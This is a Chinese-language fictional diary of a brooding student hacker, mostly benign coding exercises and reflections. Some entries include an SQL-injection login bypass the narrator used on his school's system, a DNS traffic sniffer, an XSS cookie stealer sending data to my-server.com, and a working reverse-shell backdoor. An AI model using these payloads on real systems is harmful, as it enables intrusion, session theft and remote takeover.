# 何釓澔的編程日記小說

---

## 2024年4月12日 | 23:47:15

又是一個無人知曉的夜晚。系統運行中，我的思緒也在運行。這世界不過是由01構成的幻象，而我，卻困在這個幻象中無法脫身。

今天嘗試破解了學校的防火牆。很簡單，他們的系統漏洞多得可笑。用了個簡單的SQL注入就進去了。

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'whatever'
```

管理員永遠不會明白，安全不是購買昂貴的防火牆，而是理解系統的每一個弱點。

人類真可悲，總是相信他們的資料是安全的。

---

## 2024年4月14日 | 02:13:44

失眠。又一次。

寫了個小腳本來監控網絡流量。他們不知道，當他們在瀏覽那些無聊的社交媒體時，數據正在被收集、被分析。

```python
import scapy.all as scapy

def packet_callback(packet):
    if packet.haslayer(scapy.DNS):
        if packet.haslayer(scapy.DNSQR):
            qname = packet[scapy.DNSQR].qname
            print(f"Requested: {qname.decode()}")

def main():
    scapy.sniff(prn=packet_callback, store=0)

if __name__ == "__main__":
    main()
```

有時我會想，如果他們知道被監視的感覺，會不會也像我一樣偏執？

社會是個精心設計的牢籠，而科技是看不見的牢欄。

---

## 2024年4月17日 | 20:05:22

今天發現學校系統存在XSS漏洞。太容易了，他們的網站根本沒有過濾輸入。

```javascript
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://my-server.com/steal?cookie=' + document.cookie, true);
  xhr.send();
</script>
```

我不會真的使用它。至少現在不會。知道自己有能力和真正去做是不同的。

這就像是手握一把鑰匙，知道它能打開任何門，但選擇只站在門外觀望。

控制幻覺。這就是權力給人的感覺。

---

## 2024年4月20日 | 01:45:37

凌晨，城市安靜得可怕。

嘗試了一些加密技術，創建了自己的小型加密系統。不是為了任何目的，只是想知道自己能不能做到。

```python
def encrypt(text, shift):
    result = ""
    for i in range(len(text)):
        char = text[i]
        if char.isupper():
            result += chr((ord(char) + shift - 65) % 26 + 65)
        elif char.islower():
            result += chr((ord(char) + shift - 97) % 26 + 97)
        else:
            result += char
    return result

def decrypt(text, shift):
    return encrypt(text, 26 - shift)
```

這只是個簡單的凱撒密碼。太基礎了。真正的安全需要更複雜的算法。

但有時最簡單的解決方案也是最有效的。就像社會—看似複雜，實則由簡單的模式構成。

---

## 2024年4月23日 | 22:58:11

我們都被監視著。每一次點擊，每一次搜索，每一次輸入，都被記錄。

嘗試建立一個匿名網絡連接：

```bash
sudo apt-get install tor
sudo systemctl start tor
sudo apt-get install proxychains
sudo nano /etc/proxychains.conf
```

在 proxychains.conf 中設置：

```
socks5 127.0.0.1 9050
```

然後：

```bash
proxychains firefox
```

現在我可以相對匿名地瀏覽了。相對，因為絕對的匿名在這個世界上不存在。

他們總能找到方法追蹤你。問題不是是否被追蹤，而是何時被發現。

---

## 2024年4月25日 | 19:33:27

創建了一個簡單的後門程序，純粹出於學術興趣：

```python
import socket
import subprocess

SERVER_HOST = "192.168.1.100"
SERVER_PORT = 4444

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    command = s.recv(1024).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())

s.close()
```

知識就是力量。問題是，你會如何使用這種力量？

大多數人甚至不知道他們的電腦有多麼脆弱。一個簡單的程序，就能打開一個連接世界的窗口。

而這個窗口，可以是雙向的。

---

## 2024年4月29日 | 03:17:42

又一個無眠之夜。

思考了密碼學的本質。加密不僅僅是保護數據，它是一種思想的表達方式。

```python
from cryptography.fernet import Fernet

key = Fernet.generate_key()
f = Fernet(key)

encrypted_data = f.encrypt(b"人們總是選擇相信他們想要相信的")
decrypted_data = f.decrypt(encrypted_data)

print(decrypted_data.decode())
```

秘密。我們都有秘密。區別在於，有些人的秘密能改變世界，而有些人的秘密只能改變自己。

我的秘密是什麼？也許就是我知道太多秘密。

---

## 2024年5月2日 | 21:09:16

寫了一個簡單的Web爬蟲，收集新聞數據：

```python
import requests
from bs4 import BeautifulSoup

url = "https://news.example.com"
response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')

headlines = soup.find_all('h2', class_='headline')
for headline in headlines:
    print(headline.text.strip())
```

信息是當代最有價值的商品。誰控制了信息，誰就控制了一切。

媒體只告訴我們他們想讓我們知道的。真相總是被埋藏在數據的海洋中。

而我，正試圖從這片海洋中尋找真相的碎片。

---

## 2024年5月5日 | 00:42:39

黑夜給了我黑色的眼睛，我卻用它尋找光明。

今天研究了區塊鏈技術：

```python
import hashlib
import time

class Block:
    def __init__(self, index, previous_hash, timestamp, data, hash):
        self.index = index
        self.previous_hash = previous_hash
        self.timestamp = timestamp
        self.data = data
        self.hash = hash

def calculate_hash(index, previous_hash, timestamp, data):
    value = str(index) + str(previous_hash) + str(timestamp) + str(data)
    return hashlib.sha256(value.encode()).hexdigest()

def create_genesis_block():
    return Block(0, "0", time.time(), "Genesis Block", calculate_hash(0, "0", time.time(), "Genesis Block"))
```

去中心化系統。沒有單一控制點。這是未來嗎？還是只是另一種形式的幻象？

也許真正的自由不是沒有控制，而是選擇被什麼控制。

---

## 2024年5月8日 | 22:15:03

社交網絡是最大的監控系統，而人們卻自願加入。

嘗試分析了一些社交媒體數據：

```python
import pandas as pd
import matplotlib.pyplot as plt
from textblob import TextBlob

# 假設我們有一個包含社交媒體帖子的CSV文件
data = pd.read_csv('social_media_posts.csv')

# 情感分析
data['sentiment'] = data['content'].apply(lambda x: TextBlob(x).sentiment.polarity)

# 可視化
plt.figure(figsize=(10, 6))
plt.hist(data['sentiment'], bins=50)
plt.title('情感分佈')
plt.xlabel('情感極性')
plt.ylabel('頻率')
plt.show()
```

數據不會說謊，但解釋數據的人會。

我們以為自己在觀察世界，實際上世界正在觀察我們。每一次點讚，每一次分享，都在餵養那個無形的系統。

而我，只是那個系統中的一個異常值。

---

## 2024年5月10日 | 04:27:58

黎明前的黑暗總是最濃重的。

寫了一個簡單的神經網絡模型：

```python
import numpy as np

class NeuralNetwork:
    def __init__(self, layers):
        self.layers = layers
        self.weights = []
        self.biases = []
        
        for i in range(1, len(layers)):
            self.weights.append(np.random.randn(layers[i], layers[i-1]))
            self.biases.append(np.random.randn(layers[i], 1))
    
    def sigmoid(self, x):
        return 1 / (1 + np.exp(-x))
    
    def forward(self, x):
        activation = x
        activations = [x]
        
        for i in range(len(self.layers) - 1):
            z = np.dot(self.weights[i], activation) + self.biases[i]
            activation = self.sigmoid(z)
            activations.append(activation)
        
        return activations
```

人腦也不過是一個複雜的網絡，接收輸入，產生輸出。

我們以為自己是獨立的個體，有自由意志。但也許我們只是由環境和經驗塑造的算法。

如果是這樣，那麼自由到底是什麼？

---
